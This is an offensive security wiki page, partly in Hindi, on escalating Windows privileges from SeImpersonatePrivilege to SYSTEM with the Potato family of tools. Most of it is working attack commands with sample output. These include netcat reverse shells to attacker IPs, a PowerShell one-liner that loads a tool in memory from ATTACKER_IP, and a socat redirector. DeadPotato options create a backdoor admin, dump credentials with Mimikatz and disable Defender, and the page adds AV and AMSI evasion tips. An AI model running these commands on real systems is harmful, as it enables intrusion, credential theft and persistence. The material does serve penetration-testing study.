# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> 2024–2025 में अक्सर मेंटेन किए जाने वाला एक आधुनिक विकल्प SigmaPotato (a fork of GodPotato) है जो in-memory/.NET reflection उपयोग और विस्तारित OS समर्थन जोड़ता है। नीचे त्वरित उपयोग देखें और repo को References में देखें।

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य समस्याएँ

निम्नलिखित सभी तकनीकें एक impersonation-capable privileged service का दुरुपयोग करने पर निर्भर करती हैं, और यह सेवा उस context से की जानी चाहिए जिसके पास इनमें से कोई privilege हो:

- SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
- अगर token में पहले से SeImpersonatePrivilege मौजूद है (typical कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए), तो High integrity आवश्यक नहीं है।

प्रिविलेज़ जल्दी जांचें:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- यदि आपका शेल एक प्रतिबंधित टोकन पर चलता है जिसमें SeImpersonatePrivilege नहीं है (कुछ संदर्भों में सामान्य—Local Service/Network Service), तो खाते के डिफ़ॉल्ट विशेषाधिकार FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer के लिए Print Spooler सेवा चल रही होनी चाहिए और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य होना चाहिए। ऐसे हार्डेंड वातावरणों में जहाँ Spooler PrintNightmare के बाद अक्षम कर दिया गया हो, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato के लिए TCP/135 पर पहुँच योग्य OXID resolver आवश्यक है। यदि egress ब्लॉक है, तो एक redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि कोई pipe ब्लॉक है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर अज्ञात/असमर्थित RPC authentication service को इंगित करता है; अलग pipe/transport आज़माएँ या सुनिश्चित करें कि लक्ष्य सेवा चल रही है।
- DeadPotato जैसे "Kitchen-sink" forks अतिरिक्त payload modules (Mimikatz/SharpHound/Defender off) बंडल करते हैं जो डिस्क को छूते हैं; मूल slim संस्करणों की तुलना में उच्च EDR detection की अपेक्षा रखें।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रोसेस शुरू करने के लिए कर सकते हैं, या -c का उपयोग एक-लाइन कमांड चलाने के लिए कर सकते हैं।
- Spooler service आवश्यक है। यदि यह निष्क्रिय है, तो यह विफल हो जाएगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 ब्लॉक हो, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है जो 2022 के अंत में जारी हुआ और Spooler/BITS की बजाय **PrintNotify** service को लक्षित करता है। यह binary PrintNotify COM server को instantiate करता है, एक fake `IUnknown` डालता है, और फिर `CreatePointerMoniker` के माध्यम से एक privileged callback ट्रिगर करता है। जब PrintNotify service (जो **SYSTEM** के रूप में चल रही होती है) वापस कनेक्ट करती है, तो process returned token को duplicate कर देता है और पूरा privileges लेकर supplied payload को spawn कर देता है।

Key operational notes:

* Windows 10/11 और Windows Server 2012–2022 पर काम करता है जब तक Print Workflow/PrintNotify service इंस्टॉल है (यह मौजूद रहती है यहाँ तक कि legacy Spooler PrintNightmare के बाद disabled हो जाने पर भी)।
* कॉल करने वाले context के पास **SeImpersonatePrivilege** होना आवश्यक है (आम तौर पर IIS APPPOOL, MSSQL, और scheduled-task service accounts के लिए)।
* यह सीधे command या interactive mode दोनों स्वीकार करता है ताकि आप मूल console के अंदर बने रह सकें। उदाहरण:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* क्योंकि यह पूरी तरह से COM-based है, किसी named-pipe listener या external redirector की जरूरत नहीं होती, जिससे यह उन hosts पर drop-in replacement बन जाता है जहाँ Defender RoguePotato’s RPC binding को ब्लॉक करता है।

Ink Dragon जैसे operators, SharePoint पर ViewState RCE हासिल करने के तुरंत बाद PrintNotifyPotato चलाते हैं ताकि `w3wp.exe` worker से SYSTEM पर pivot किया जा सके और उसके बाद ShadowPad इंस्टॉल किया जा सके।

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: अगर एक pipe फेल हो जाए या EDR इसे ब्लॉक कर दे, तो दूसरे समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
नोट:
- Windows 8/8.1–11 और Server 2012–2022 पर काम करता है जब SeImpersonatePrivilege मौजूद हो।

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato दो variants प्रदान करता है जो service DCOM objects को लक्षित करते हैं जिनका डिफ़ॉल्ट स्तर RPC_C_IMP_LEVEL_IMPERSONATE है। प्रदान किए गए binaries को बनाएं या उनका उपयोग करें और अपना command चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे कि in-memory execution via .NET reflection और PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- बिल्ट-इन reverse shell flag `--revshell` और PowerShell की 1024-चर सीमा हटाई गई है, जिससे आप लंबे AMSI-bypassing payloads एक ही बार में चला सकते हैं।
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), साथ ही सरल हीयुरिस्टिक्स को भ्रमित करने के लिए `VirtualAllocExNuma()` के माध्यम से एक प्राथमिक AV evasion trick।
- PowerShell Core environments के लिए .NET 2.0 के खिलाफ compiled अलग `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato GodPotato के OXID/DCOM impersonation chain को बनाए रखता है लेकिन post-exploitation helpers शामिल करता है ताकि operators तुरंत SYSTEM ले सकें और अतिरिक्त tooling के बिना persistence/collection कर सकें।

Common modules (सभी को SeImpersonatePrivilege की जरूरत होती है):

- `-cmd "<cmd>"` — SYSTEM के रूप में मनमाना कमांड चलाएँ।
- `-rev <ip:port>` — तेज़ reverse shell।
- `-newadmin user:pass` — persistence के लिए लोकल admin बनाएं।
- `-mimi sam|lsa|all` — Mimikatz छोड़कर चलाकर credentials dump करें (डिस्क पर लिखता है, noisy)।
- `-sharphound` — SharpHound collection को SYSTEM के रूप में चलाएँ।
- `-defender off` — Defender real-time protection को बंद करें (बहुत noisy)।

उदाहरण एक-लाइनर:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
क्योंकि यह अतिरिक्त बाइनरी के साथ आता है, AV/EDR फ़्लैग अधिक आने की उम्मीद रखें; जब stealth मायने रखता है तो हल्के GodPotato/SigmaPotato का उपयोग करें।

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
